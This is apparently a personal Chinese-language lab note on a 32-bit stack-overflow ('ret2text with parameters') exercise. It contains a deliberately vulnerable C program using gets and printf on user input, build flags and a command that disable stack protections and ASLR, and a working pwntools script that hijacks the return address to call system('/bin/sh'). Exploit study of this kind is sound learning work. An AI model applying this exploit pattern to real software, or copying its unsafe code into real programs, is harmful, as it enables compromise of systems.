### 栈溢出

#### test ret2textWithParams

* 这里在栈上注入字符串失败，因为在后续栈的使用中被覆盖，改用内存中搜索到的字符串

```c
// example
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> 
char sh[]="/bbbbbbbbbbbbbbin/sh"; 

int init_func(){
	setvbuf(stdin,0,2,0); 
	setvbuf(stdout,0,2,0); 
	setvbuf(stderr,0,2,0); 
	return 0;
}

int func(char *cmd){ 
	system(cmd); 
	return 0; 
}

int main(){ 
	init_func(); 
	char a[32] ={}; 
	puts("input: ");
	gets(a);
	printf(a); 
	return 0; 
}
```

```shell
# 关闭PIE NX STACK CANARY
gcc -m32 -no-pie -fno-pie -fno-stack-protector -z execstack program.c -o program

# 查看ASLR是否开启，现代操作系统默认开启了 ASLR，这会导致每次程序运行时，栈、堆、库函数（如 libc）、程序本身的数据段/代码段 的地址都可能会变化，难以确定注入栈上注入的shellcode的地址
cat  /proc/sys/kernel/randomize_va_space

# 临时关闭ASLR，重启后恢复
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

```python
from pwn import *

context(log_level='debug',arch='i386', os='linux')
context.binary = '/home/lideao/C/retShellcode32'
context.terminal = ['gnome-terminal', '--']  # 或 tmux 等

io = process()
gdb.attach(io, '''
    b main
    b *main+136
    c
''')

esp = b'\xb0\xc9\xff\xff'

cmd = b'' # 这里注入易被覆盖
nop = b'\x00'*(32-len(cmd)+4)
oldrsp = bytes([esp[0]+0x30])+esp[1:]
oldrbp = b'\x00'*4
retIp = b'\x63\x92\x04\x08'
nopCallip = b'\x00'*4
# paramPoint指向内存中搜索到的字符串
paramPoint = b'\x26\xcc\xff\xff'



print("wait...")
# 等待程序跑到输入处
print("exe echo:\n"+io.recvuntil(b'input: ').decode())

pause()

payload = cmd + nop + oldrsp + oldrbp + retIp + nopCallip + paramPoint
# payload = b'aaaaa'
print("start send payload......")
io.sendline(payload)
print("send success!")

io.interactive()

```

